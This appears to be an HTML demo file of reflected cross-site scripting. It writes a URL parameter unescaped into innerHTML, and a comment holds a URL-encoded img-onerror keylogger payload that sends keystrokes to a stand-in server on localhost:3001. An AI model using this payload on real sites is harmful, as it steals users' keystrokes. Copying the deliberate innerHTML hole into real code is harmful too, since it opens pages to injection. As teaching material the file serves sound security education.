<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>XSS Example</title>
  </head>
  <body>
    <!-- Vulnerable Script -->
    <!-- http://127.0.0.1:5500/example.html?name=
        %3Cimg%20src%3D%22does-not-exist%22%20
        onerror%3D%27var%20timeout%3B%20var%20buffer
        %20%3D%20%22%22%3B%20document.querySelector(%22body%22).
        addEventListener(%22keypress%22%2C%20(event)
        %20%3D%3E%20%7B%20if%20(event.which%20!%3D%3D%200)
        %20%7B%20clearTimeout(timeout)%3B%20buffer%20%2B%3D%20String.
        fromCharCode(event.which)%3B%20timeout%20%3D%20
        setTimeout(()%20%3D%3E%20%7B%20var%20xhr%20%3D%20new%20
        XMLHttpRequest()%3B%20var%20uri%20%3D%20%22http%3A%2F%2F
        localhost%3A3001%2Fkeys%3Fdata%3D%22%2B%20
        encodeURIComponent(buffer)%3B%20xhr.open(%22GET%22%2C%20uri)
        %3B%20xhr.send()%3B%20buffer%20%3D%20%22%22%3B%20%7D%2C%20400)
        %3B%20%7D%7D)%3B%27%0A%2F%3E -->
    <!-- Vulnerable Code -->
    <div>Welcome, <span id="username"></span>!</div>

    <script>
      // Function to set a cookie, mostly this will be set from server
      function setCookie(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
        const expires = 'expires=' + date.toUTCString();
        document.cookie = name + '=' + value + ';' + expires + ';path=/';
      }

      // Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
      setCookie('exampleCookie', 'Hello, Cookie!', 7);
    </script>

    <!-- Vulnerable Code -->
    <script>
      const params = new URLSearchParams(window.location.search);
      const name = params.get('name');
      document.getElementById('username').innerHTML = name;
    </script>
  </body>
</html>
